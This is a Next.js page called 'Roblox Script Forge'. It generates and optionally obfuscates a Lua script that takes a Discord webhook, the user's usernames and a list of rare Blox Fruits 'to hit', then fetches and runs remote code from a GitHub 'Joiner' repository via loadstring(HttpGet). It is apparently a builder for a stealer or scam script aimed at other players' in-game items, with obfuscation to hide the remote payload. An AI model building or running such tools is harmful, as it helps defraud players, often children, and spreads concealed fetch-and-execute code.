
"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Download } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const mythicalFruits = [
  "Kitsune-Kitsune",
  "Yeti-Yeti",
  "Gas-Gas",
  "Leopard-Leopard",
  "Control-Control",
  "Dough-Dough",
  "T-Rex-T-Rex",
  "Spirit-Spirit",
  "Mammoth-Mammoth",
  "Venom-Venom",
];
const legendaryFruits = [
  "Portal-Portal",
  "Buddha-Buddha",
  "Rumble-Rumble",
  "Shadow-Shadow",
  "Blizzard-Blizzard",
  "Sound-Sound",
  "Phoenix-Phoenix",
  "Pain-Pain",
  "Gravity-Gravity",
  "Love-Love",
  "Spider-Spider",
  "Quake-Quake",
];
const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
const defaultSelectedFruits = ["Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"];

export default function Home() {
  const [webhookUrl, setWebhookUrl] = useState("");
  const [usernames, setUsernames] = useState("");
  const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits);
  const [generatedScript, setGeneratedScript] = useState("");
  const [apiKey, setApiKey] = useState("");
    const { toast } = useToast();

  const generateScript = () => {
    let script = `Webhook = "${webhookUrl}" -- << Discord Webhook Here\n`;
    script += `Usernames = {${usernames
      .split("\n")
      .map((user) => `"${user}"`)
      .join(", ")}} -- << Your usernames here, you can add as many alts as you want\n`;
    script += `FruitsToHit = {${selectedFruits.map((fruit) => `"${fruit}"`).join(", ")}} -- << Fruits you want the script to detect\n`;
    script += `loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;
    setGeneratedScript(script);
  };

  const handleFruitSelect = (fruit: string) => {
    setSelectedFruits((prev) => {
      if (prev.includes(fruit)) {
        return prev.filter((f) => f !== fruit);
      } else {
        return [...prev, fruit];
      }
    });
  };

  const downloadScript = async () => {
    if (!generatedScript) {
          toast({
            title: "Error",
            description: "Please generate a script first.",
            variant: "destructive",
          });
      return;
    }

    // First, obfuscate the script
    let obfuscatedScript = generatedScript;
    if (apiKey) {
      try {
        const response = await fetch("/api/obfuscate", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ script: generatedScript, apiKey: apiKey }),
        });

        if (!response.ok) {
            toast({
              title: "Error",
              description: `Failed to obfuscate script: ${response.statusText}`,
              variant: "destructive",
            });
          return;
        }

        const data = await response.json();
        obfuscatedScript = data.obfuscatedScript;
      } catch (error: any) {
            toast({
              title: "Error",
              description: `Failed to obfuscate script: ${error.message}`,
              variant: "destructive",
            });
        return;
      }
    }

    // Create a blob from the obfuscated script
    const blob = new Blob([obfuscatedScript], { type: "text/plain" });
    const url = URL.createObjectURL(blob);

    // Create a download link
    const a = document.createElement("a");
    a.href = url;
    a.download = "roblox_script.lua";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="container mx-auto p-4">
      <h1 className="text-2xl font-bold mb-4">Roblox Script Forge</h1>

      <div className="mb-4">
        <Label htmlFor="webhookUrl">Discord Webhook URL</Label>
        <Input
          type="text"
          id="webhookUrl"
          value={webhookUrl}
          onChange={(e) => setWebhookUrl(e.target.value)}
          placeholder="Enter your Discord Webhook URL"
          className="w-full"
        />
      </div>

      <div className="mb-4">
        <Label htmlFor="usernames">Usernames (one per line)</Label>
        <Textarea
          id="usernames"
          value={usernames}
          onChange={(e) => setUsernames(e.target.value)}
          placeholder="Enter usernames, one per line"
          className="w-full"
        />
      </div>

      <div className="mb-4">
        <Label>Fruits to Hit</Label>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
          {sortedFruitsByRarity.map((fruit) => (
            <div key={fruit} className="flex items-center space-x-2">
              <Checkbox
                id={fruit}
                checked={selectedFruits.includes(fruit)}
                onCheckedChange={() => handleFruitSelect(fruit)}
              />
              <Label htmlFor={fruit}>{fruit}</Label>
            </div>
          ))}
        </div>
      </div>
      <div className="mb-4">
        <Label htmlFor="apiKey">luaobfuscator.com API Key (Optional)</Label>
        <Input
          type="text"
          id="apiKey"
          value={apiKey}
          onChange={(e) => setApiKey(e.target.value)}
          placeholder="Enter your luaobfuscator.com API Key"
          className="w-full"
        />
      </div>

      <div className="mb-4">
        <Button onClick={generateScript} className="bg-primary text-primary-foreground hover:bg-primary/80">
          Generate Script
        </Button>
      </div>

      {generatedScript && (
        <div className="mb-4">
          <Label>Generated Script</Label>
          <Textarea value={generatedScript} readOnly className="w-full" />
        </div>
      )}

      <Button
        onClick={downloadScript}
        className="bg-accent text-accent-foreground hover:bg-accent/80"
        disabled={!generatedScript}
      >
        <Download className="mr-2 h-4 w-4" />
        Download Script
      </Button>
    </div>
  );
}
